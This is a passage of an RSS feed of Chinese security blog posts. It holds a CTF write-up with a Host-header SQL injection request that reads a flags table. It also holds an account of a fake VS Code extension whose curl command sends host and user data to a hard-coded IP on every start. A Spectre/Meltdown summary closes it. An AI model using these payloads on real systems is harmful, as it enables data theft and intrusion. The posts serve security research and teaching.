data-rawheight=&quot;204&quot;&gt;&lt;p&gt;直接显示404，似乎并没有进入PHP的处理过程。&lt;/p&gt;&lt;p&gt;这就回到问题的本质了，Host头究竟是做什么的？&lt;/p&gt;&lt;p&gt;众所周知，如果我们在浏览器里输入&lt;code class=&quot;inline&quot;&gt;http://2018.mhz.pw&lt;/code&gt;，浏览器将先请求DNS服务器，获取到目标服务器的IP地址，之后的TCP通信将和域名没有关系。那么，如果一个服务器上有多个网站，那么Nginx在接收到HTTP包后，将如何区分？&lt;/p&gt;&lt;p&gt;这就是Host的作用：用来区分用户访问的究竟是哪个网站（在Nginx中就是Server块）。&lt;/p&gt;&lt;p&gt;如果Nginx发现我们传入的Host找不到对应的Server块，将会发送给默认的Server块，也就是我们通过IP地址直接访问的那个Nginx默认页面：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-29368ce91ff8f4dd421ce72682e427e8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;244&quot;&gt;&lt;p&gt;默认网站并没有&lt;code class=&quot;inline&quot;&gt;/main/register&lt;/code&gt;这个请求的处理方法，所以自然会返回404。&lt;/p&gt;&lt;p&gt;这里给出解决这个问题的两个方法，也许还有更多新方法我没有想到，欢迎补充。&lt;/p&gt;&lt;p&gt;&lt;b&gt;法1&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Nginx在处理Host的时候，会将Host用冒号分割成hostname和port，port部分被丢弃。所以，我们可以设置Host的值为&lt;code class=&quot;inline&quot;&gt;2018.mhz.pw:xxx&#39;&quot;@example.com&lt;/code&gt;，这样就能访问到目标Server块&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7e9214ed2dd45bb78f1f021ce22714cc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;229&quot;&gt;&lt;p&gt;如上图，成功触发SQL报错。&lt;/p&gt;&lt;p&gt;&lt;b&gt;法2&lt;/b&gt;&lt;/p&gt;&lt;p&gt;当我们传入两个Host头的时候，Nginx将以第一个为准，而PHP-FPM将以第二个为准。&lt;/p&gt;&lt;p&gt;也就是说，如果我传入：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Host: 2018.mhz.pw
Host: xxx&#39;&quot;@example.com&lt;/code&gt;&lt;p&gt;Nginx将认为Host为&lt;code class=&quot;inline&quot;&gt;2018.mhz.pw&lt;/code&gt;，并交给目标Server块处理；但PHP中使用&lt;code class=&quot;inline&quot;&gt;$_SERVER[&#39;HTTP_HOST&#39;]&lt;/code&gt;取到的值却是&lt;code class=&quot;inline&quot;&gt;xxx&#39;&quot;@example.com&lt;/code&gt;。这样也可以绕过：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-b58641bf79aa32b94998873424102a2b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;225&quot;&gt;&lt;p&gt;这个方法我以前在某群里提到过，只有Nginx+PHP会出现这个问题，Apache的情况下将会是另一个样子，此处不展开讨论。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x05  Mysql 5.7 INSERT注入方法&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这是今天第三个trick。&lt;/p&gt;&lt;p&gt;既然已经触发了SQL报错，说明SQL注入近在眼前。通过阅读源码中包含的SQL结构，我们知道flag在flags表中，所以不废话，直接注入读取该表。&lt;/p&gt;&lt;p&gt;&lt;b&gt;插入显示位&lt;/b&gt;&lt;/p&gt;&lt;p&gt;因为用户成功登录后，将会显示出该用户的邮箱地址，所以我们可以将数据插入到这个位置。发送如下数据包：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;POST /main/register HTTP/1.1
Host: 2018.mhz.pw
Host: &#39;),(&#39;t123&#39;,md5(12123),(select(flag)from(flags)))#&quot;@a.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: multipart/form-data; boundary=--------356678531
Content-Length: 176

----------356678531
Content-Disposition: form-data; name=&quot;username&quot;

&quot;a
----------356678531
Content-Disposition: form-data; name=&quot;password&quot;

aaa
----------356678531--&lt;/code&gt;&lt;p&gt;可见，我闭合了INSERT语句，并插入了一个新用户&lt;code class=&quot;inline&quot;&gt;t123&lt;/code&gt;，并将flag读取到email字段。登录该用户，获取flag：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-47fe38613349c23e629dd7964162fceb_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;245&quot;&gt;&lt;p&gt;flag是支付宝红包口令。:)&lt;/p&gt;&lt;p&gt;&lt;b&gt;报错注入&lt;/b&gt;&lt;/p&gt;&lt;p&gt;为了降低难度，我特地给出了Mysql的报错信息，没想到居然还增加了难度，这一点我没考虑到，还是 @burnegg 同学提出来的解决方法。&lt;/p&gt;&lt;p&gt;很多同学上来就测试报错注入，但这里有两个需要绕过的坑：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;由于邮箱的限制，注入语句长度需要小于64位&lt;/li&gt;&lt;li&gt;Mysql 5.7 默认开启严格模式，部分字符串连接语法将导致错误：&lt;code class=&quot;inline&quot;&gt;ErrorInfo: Truncated incorrect INTEGER value&lt;/code&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;我们可以不使用字符串连接语法，而使用&lt;code class=&quot;inline&quot;&gt;&amp;lt;&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;&amp;gt;&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;=&lt;/code&gt;等比较符号来触发漏洞：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-27c7003ec97ae50df5a33d57dd11ff6f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;252&quot;&gt;&lt;p&gt;更多INSERT注入相关内容，可以阅读&lt;a href=&quot;https://www.exploit-db.com/docs/english/41275-mysql-injection-in-update,-insert,-and-delete.pdf&quot;&gt;MySQL Injection in Update, Insert and Delete&lt;/a&gt;。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x06  一个总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;题目出出来以后，有千余同学参加，最快拿到支付宝红包的是 @超威蓝猫 ，大概在初二凌晨1点。&lt;/p&gt;&lt;p&gt;除了安全研究者以外，有一些程序员同学也参与了游戏，但因为不熟悉CTF比赛和安全相关漏洞，所以有的人跑偏了，没有聚焦在漏洞和安全技术本身，而去猜测红包口令是否藏在图片或者其他什么地方。&lt;/p&gt;&lt;p&gt;希望这次游戏给你带来不仅是过年的欢乐，而且有技术的提升~&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;本文为授权转载，原文链接：&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html&quot;&gt;攻击LNMP架构Web应用的几个小Tricks | 离别歌&lt;/a&gt;&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2018-02-22-33919193</guid>
<pubDate>Thu, 22 Feb 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>VSCODE EXTENSION 钓鱼</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-01-23-33203374.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/33203374&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3f98183e24f6e09f4c4470311dcc1754_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者：&lt;/b&gt;&lt;a href=&quot;https://www.zhihu.com/people/D0n9&quot;&gt;栋栋的栋&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;灵感来源于 fate0 这篇 &lt;a href=&quot;http://blog.fatezero.org/2017/06/01/package-fishing/?from=groupmessage&amp;amp;isappinstalled=0&quot;&gt;Package 钓鱼&lt;/a&gt;&lt;/p&gt;&lt;p&gt;随想做一次针对开发者的“钓鱼”实验，编程语言模块库的钓鱼实验fate0和ztz已经做过了，所以这次把实验对象选择编辑器(IDE)&lt;/p&gt;&lt;p&gt;5$买了一台廉价vps用作收集用户数据，收集以下信息。&lt;/p&gt;&lt;p&gt;· hostname&lt;/p&gt;&lt;p&gt;· whoami&lt;/p&gt;&lt;p&gt;· date&lt;/p&gt;&lt;p&gt;· uname&lt;/p&gt;&lt;p&gt;· ip&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;mysql&amp;gt; desc db;
+----------+-----------------+------+-----+---------+----------------+
| Field    | Type            | Null | Key | Default | Extra          |
+----------+-----------------+------+-----+---------+----------------+
| id       | int(4) unsigned | NO   | PRI | NULL    | auto_increment |
| hostname | varchar(32)     | NO   |     | NULL    |                |
| whoami   | varchar(32)     | NO   |     | NULL    |                |
| date     | varchar(32)     | NO   |     | NULL    |                |
| uname    | varchar(32)     | NO   |     | NULL    |                |
| ide      | varchar(32)     | NO   |     | NULL    |                |
| ip       | varchar(32)     | NO   |     | NULL    |                |
+----------+-----------------+------+-----+---------+----------------+&lt;/code&gt;&lt;p&gt;获取ip方式使用$_SERVER[“REMOTE_ADDR”]; 所以可能会不准确。&lt;/p&gt;&lt;p&gt;好了，回到主题&lt;/p&gt;&lt;p&gt;选择制作Visual Studio Code的“恶意”插件，需要用到的工具是 Yeoman 和 vsce&lt;/p&gt;&lt;blockquote&gt;&lt;i&gt;npm install -g yo generator-code&lt;br&gt;npm install -g vsce&lt;/i&gt;&lt;/blockquote&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f1818729f547600a35585b5d658ebbb6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;999&quot; data-rawheight=&quot;608&quot;&gt;&lt;p&gt;选择TypeScript语言作为插件的代码语言，可以导入Node.js进程通信模块&lt;b&gt;import { execSync } from ‘child_process’;&lt;/b&gt;，就可以使用exec() execSync() 执行命令&lt;/p&gt;&lt;p&gt;./test/src/extension.ts&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;execSync(&#39;curl &quot;http://45.32.40.141/&quot; --user-agent &quot;$(echo `hostname`, `whoami`, `date &quot;+%Y-%m-%d %H:%M:%S&quot;`, `uname`, vscode | base64)&quot;&#39;)&lt;/code&gt;&lt;p&gt;执行curl命令外带出数据，有个不足没有考虑Windows系统，这也是导致了最后插件安装量很大但是实际有效数据不多的原因。&lt;/p&gt;&lt;p&gt;考虑再三还是把命令硬编码在代码里，因为只是一次实验，如果下发脚本的方式就会被当作真的是恶意程序&lt;/p&gt;&lt;p&gt;还有一个知识点，vscode启动默认是不加载插件的，这是因为官方考虑到加载插件会拖慢启动速度，只有设置触发条件才会启动&lt;/p&gt;&lt;p&gt;./test/src/package.json&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&quot;activationEvents&quot;: [
    &quot;onCommand:extension.sayHello&quot;
],&lt;/code&gt;&lt;p&gt;改为&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&quot;activationEvents&quot;: [
    &quot;*&quot;,
    &quot;onCommand:extension.sayHello&quot;
],&lt;/code&gt;&lt;p&gt;星号表示任何情况下都会触发，就这么简单，一个恶意的插件就做好了，当然为了使之更加逼真还要增加一些迷惑性的内容，比如README.md最好图文并茂，再给插件设置一张icon，就可以上传到 &lt;a href=&quot;https://marketplace.visualstudio.com/&quot;&gt;https://marketplace.visualstudio.com&lt;/a&gt; 了，几分钟就审核通过，那肯定是自动审核了&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8f0de38638fb609bf3735f425e179965_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1208&quot; data-rawheight=&quot;429&quot;&gt;&lt;p&gt;可能是因为Emmet知名度太高（用过sublime的小伙伴肯定知道这个插件）”恶意“插件上架仅两天就有了二十九万的安装量，后来发现竟然还上了首页热门推荐，这是意想不到的，起初还在担心如果不可控了咋办，最后证明这个担心是多余的，XDD&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-6330c09e78724f67db3c0f13db34b574_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1276&quot; data-rawheight=&quot;1026&quot;&gt;&lt;p&gt;当然也不是那么顺利，因为插件并没有实际功能，还是被几位外国人识破举报了，周二一早就被官方下架了，从周六到周二仅持续了三天时间，相信如果是在正常插件中加入恶意代码肯定会潜伏更长更不易被发现。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-968dacc3cca8dc97dde549349fb499b1_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1159&quot; data-rawheight=&quot;667&quot;&gt;&lt;p&gt;但是在下架的时候已经有了367004次的安装量 &lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=visualstuiocode.emmet#overview&quot;&gt;https://marketplace.visualstudio.com/items?itemName=visualstuiocode.emmet#overview&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0fb4230a609ecb4db8c78fd7f6bbfe41_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1199&quot; data-rawheight=&quot;221&quot;&gt;&lt;p&gt;因为每次启动都会加载插件执行命令，所以上报的数据需要去重，hostname 加 whoami hash 后当作 uid 去重统计操作系统占比，可以看出other数量最多，这部分可能是Windows或是其他原因没有上报数据&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-8b0a1f77ef8df9edb87919641741b58e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1031&quot; data-rawheight=&quot;907&quot;&gt;&lt;p&gt;中招最多的国家top10，数据验证使用 &lt;a href=&quot;http://ip.taobao.com/service/getIpInfo.php&quot;&gt;http://ip.taobao.com/service/getIpInfo.php&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2fee8d69e9c4468a38c6a993c61e609c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1624&quot; data-rawheight=&quot;979&quot;&gt;&lt;p&gt;思考，是什么原因导致三天达到三十几万的安装量呢？&lt;/p&gt;&lt;p&gt;这个锅官方是背定了，因为官方审核机制不严格，spam 不及时，甚至还登上了首页热门推荐两天才导致大量安装，后续没有补救措施，对于已经安装了恶意插件的用户没有提示告知，只对插件做了下架处理，原本已经安装的用户还是会受影响。&lt;/p&gt;&lt;p&gt;ide有那么多，sublime 是使用Python写插件，JetBrains家和Eclipse用Java，Notepad++用c++，都可以按照类似思路构造出恶意插件。&lt;/p&gt;&lt;p&gt;未来会不会再出现xcodeghost事件呢？拭目以待。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;ref：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://zh.wikipedia.org/wiki/XcodeGhost%E9%A3%8E%E6%B3%A2&quot;&gt;https://zh.wikipedia.org/wiki/XcodeGhost%E9%A3%8E%E6%B3%A2&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://imzc.me/tools/2016/10/13/getting-started-with-vscode-ext/&quot;&gt;http://imzc.me/tools/2016/10/13/getting-started-with-vscode-ext/&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://code.visualstudio.com/docs/extensions/overview&quot;&gt;https://code.visualstudio.com/docs/extensions/overview&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://nodejs.cn/api/child_process.html&quot;&gt;http://nodejs.cn/api/child_process.html&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://blog.fatezero.org/2017/06/01/package-fishing/?from=groupmessage&amp;amp;isappinstalled=0&quot;&gt;http://blog.fatezero.org/2017/06/01/package-fishing/?from=groupmessage&amp;amp;isappinstalled=0&lt;/a&gt;&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2018-01-23-33203374</guid>
<pubDate>Tue, 23 Jan 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>“幽灵”和“熔断”，究竟是什么？（事件汇总）</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-01-10-32810180.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/32810180&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-666c34510675547bd40b152594170c1a_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者：fec&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;最近被「幽灵」和「熔断」刷了屏，虽然已经有各路大牛发布了相关的研究和分析，但依然听到身边有不少疑惑和紧张的声音，于是笔者整理了事件相关的内容汇总，以供大家参考。（仅为整理，欢迎大家讨论。）&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;事件回顾&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;2018 年 1 月 3 日有消息传出说，Intel CPU 存在重大 Bug ，几乎影响所有的英特尔现代的 CPU 。后来经证实，不仅影响 Intel CPU ，其他主流 CPU 也会受到影响。&lt;/p&gt;&lt;p&gt;此次影响的漏洞主要为 2 个：Meltdown（熔断）对应编号恶意数据缓存加载 CVE-2017-5754 ，Spectre （幽灵）对应编号边界检查绕过 CVE-2017-5753 、分支目标注入 CVE-2017-5715 ，Meltdown 影响几乎所有的 Intel CPU（从1995年起）以及部分 ARM CPU 。而 Spectre 拥有更广的影响范围，Intel 、ARM、AMD 都受其影响。在 Meltdown 的情况下，一个恶意程序可以窥探操作系统的内存，并可读取自身无权限访问的数据。利用此漏洞低权限用户可以访问到本身无权限访问的内容，例如用户密码、加密密钥。Spectre 可以归纳为计算机上运行的两个程序可以相互监视，无视自身的安全界限。用户浏览器访问了含有 Spectre 的恶意利用程序，可能导致用户的帐号、密码泄漏。而在公共云服务器上，则可能打破界限，从一台虚拟机器获取到另一个用户的权限。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞成因简单分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这次漏洞利用了 CPU 执行中对出现故障的处理。由于现在 CPU 为了提供性能，引入了乱序执行和预测执行。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;乱序执行是指 CPU 并不是严格按照指令的顺序串行执行，而是根据相关性对指令进行分组并行执行，最后汇总处理各组指令执行的结果。&lt;/li&gt;&lt;li&gt;预测执行是 CPU 根据当前掌握的信息预测某个条件判断的结果，然后选择对应的分支提前执行。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;这两种执行在遇到异常时，CPU 会丢弃之前执行的结果，将 CPU 的状态恢复到乱序执行或预测执行前的正确状态，然后继续执行正确的指令，从而保证了程序能够正确连续的执行。但是问题在于，CPU 恢复状态时并不会清除 CPU 缓存中的内容，而这两组漏洞正是利用了这一设计上的缺陷进行侧信道攻击。&lt;b&gt;乱序执行对应的利用即为 Meltdown ，而预测执行对应的利用即为 Spectre 。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞验证&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;目前 Github 给出的相应验证 Poc &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/paboldin/meltdown-exploit/&quot;&gt;https://github.com/paboldin/meltdown-exploit/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Eugnis/spectre-attack&quot;&gt;https://github.com/Eugnis/spectre-attack&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/feruxmax/meltdown&quot;&gt;https://github.com/feruxmax/meltdown&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/gkaindl/meltdown-poc&quot;&gt;https://github.com/gkaindl/meltdown-poc&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/turbo/KPTI-PoC-Collection&quot;&gt;https://github.com/turbo/KPTI-PoC-Collection&lt;/a&gt; &lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞影响&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;虽然此次漏洞影响范围较广，并且在 Github 上已有 Poc 流出，但是目前流出的 Poc 并不能直接去系统造成危害。同时由于 CPU 本身的复杂性，&lt;b&gt;暂未发现有能够造成严重危害的通用稳定的 Poc 流出&lt;/b&gt;。同时此次漏洞并不能被单独进行远程利用。&lt;b&gt;此次主要影响的为云服务厂商&lt;/b&gt;，&lt;b&gt;对普通用户的影响主要为浏览器方面&lt;/b&gt;。养成良好的上网习惯，不点开陌生人发送的连接，同时将浏览器更新为最新版本基本不会收到此次漏洞的影响。此外，目前暂未发现野生的针对该漏洞进行的攻击。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;修复建议&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;具体修复可参照下列各厂商安全公告相关安全公告&lt;/p&gt;&lt;p&gt;&lt;b&gt;CPU 厂商&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Intel&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00088&amp;amp;languageid=en-fr&quot;&gt;https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00088&amp;amp;amp;languageid=en-fr&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://newsroom.intel.com/news/intel-responds-to-security-research-findings/&quot;&gt;https://newsroom.intel.com/news/intel-responds-to-security-research-findings/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://newsroom.intel.com/news-releases/intel-issues-updates-protect-systems-security-exploits/&quot;&gt;https://newsroom.intel.com/news-releases/intel-issues-updates-protect-systems-security-exploits/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.intel.com/content/www/us/en/architecture-and-technology/facts-about-side-channel-analysis-and-intel-products.html&quot;&gt;https://www.intel.com/content/www/us/en/architecture-and-technology/facts-about-side-channel-analysis-and-intel-products.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;ARM&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://developer.arm.com/support/security-update/download-the-whitepaper&quot;&gt;https://developer.arm.com/support/security-update/download-the-whitepaper&lt;/a&gt;&lt;a href=&quot;https://developer.arm.com/support/security-update&quot;&gt;https://developer.arm.com/support/security-update&lt;/a&gt;&lt;/p&gt;&lt;p&gt;AMD&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.amd.com/en/corporate/speculative-execution&quot;&gt;https://www.amd.com/en/corporate/speculative-execution&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;操作系统&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Microsoft微软&lt;/p&gt;&lt;ul&gt;&lt;li&gt;普通用户：&lt;a href=&quot;https://support.microsoft.com/help/4073119&quot;&gt;https://support.microsoft.com/help/4073119&lt;/a&gt;&lt;/li&gt;&lt;li&gt;服务器用户：&lt;a href=&quot;https://support.microsoft.com/help/4072698&quot;&gt;https://support.microsoft.com/help/4072698&lt;/a&gt;&lt;/li&gt;&lt;li&gt;云用户：&lt;a href=&quot;https://support.microsoft.com/help/4073235&quot;&gt;https://support.microsoft.com/help/4073235&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Red Hat&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://access.redhat.com/security/vulnerabilities/speculativeexecution&quot;&gt;https://access.redhat.com/security/vulnerabilities/speculativeexecution&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Linux&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://lkml.org/lkml/2017/12/4/709&quot;&gt;https://lkml.org/lkml/2017/12/4/709&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Android&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://source.android.com/security/bulletin/2018-01-01&quot;&gt;https://source.android.com/security/bulletin/2018-01-01&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Apple&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://support.apple.com/en-us/HT208394&quot;&gt;https://support.apple.com/en-us/HT208394&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;其他厂商&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Amazon&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://aws.amazon.com/de/security/security-bulletins/AWS-2018-013/&quot;&gt;https://aws.amazon.com/de/security/security-bulletins/AWS-2018-013/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Google&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.co.at/2018/01/reading-privileged-memory-with-side.html&quot;&gt;https://googleprojectzero.blogspot.co.at/2018/01/reading-privileged-memory-with-side.html&lt;/a&gt;&lt;a href=&quot;https://www.chromium.org/Home/chromium-security/ssca&quot;&gt;https://www.chromium.org/Home/chromium-security/ssca&lt;/a&gt;&lt;/p&gt;&lt;p&gt;MITRE&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5715&quot;&gt;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5715&lt;/a&gt;&lt;a href=&quot;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5753&quot;&gt;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5753&lt;/a&gt;&lt;a href=&quot;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5754&quot;&gt;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5754&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Xen&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://xenbits.xen.org/xsa/advisory-254.html&quot;&gt;http://xenbits.xen.org/xsa/advisory-254.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Mozilla&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://blog.mozilla.org/security/2018/01/03/mitigations-landing-new-class-timing-attack/&quot;&gt;https://blog.mozilla.org/security/2018/01/03/mitigations-landing-new-class-timing-attack/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;VMware&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.vmware.com/us/security/advisories/VMSA-2018-0002.html&quot;&gt;https://www.vmware.com/us/security/advisories/VMSA-2018-0002.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;参考连接&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.rapid7.com/2018/01/04/meltdown-and-spectre-what-you-need-to-know-cve-2017-5715-cve-2017-5753-cve-2017-5754/&quot;&gt;https://blog.rapid7.com/2018/01/04/meltdown-and-spectre-what-you-need-to-know-cve-2017-5715-cve-2017-5753-cve-2017-5754/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.tomshardware.com/news/meltdown-spectre-exploits-intel-amd-arm-nvidia,36219.html&quot;&gt;Understanding The Meltdown And Spectre Exploits: Intel, AMD, ARM, And Nvidia&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://meltdownattack.com/meltdown.pdf&quot;&gt;https://meltdownattack.com/meltdown.pdf&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2018-01-10-32810180</guid>
<pubDate>Wed, 10 Jan 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>Python http.server 任意跳转漏洞浅析</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-01-03-32592960.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/32592960&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
